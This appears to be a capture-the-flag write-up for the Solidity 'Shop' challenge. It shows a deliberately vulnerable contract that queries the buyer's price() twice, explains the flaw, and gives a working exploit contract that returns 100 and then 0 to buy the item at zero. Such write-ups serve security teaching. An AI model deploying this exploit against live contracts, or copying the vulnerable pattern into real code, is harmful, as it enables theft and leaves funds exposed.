<div align="center">

# Shop

</div>



**Shop (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**

  - `Shop` sells an item at a fixed `price` (100) and sets `isSold = true` once purchased.  
  - `buy()` checks `msg.sender.price()` to determine if the buyer is offering enough.  
  - **Key idea:** The contract **trusts the buyer’s `price()`** dynamically — it calls the buyer’s contract each time, so a malicious buyer can **lie differently on each call**.


1. **Vulnerability Highlight (key part)**


```solidity

function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price(); // called again — buyer can return a different value
    }
}

```


## Exploit Code

```Solidity

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
}

contract ShopExploit {
    IShop public shop;
    
    constructor(address _shop) {
        shop = IShop(_shop);
    }
    
    function attack() external {
        shop.buy();
    }
    
    function price() external view returns (uint256) {
        // First call: return 100 (meets the requirement)
        // Second call: return 0 (after isSold is true)
        return shop.isSold() ? 0 : 100;
    }
}



```

---


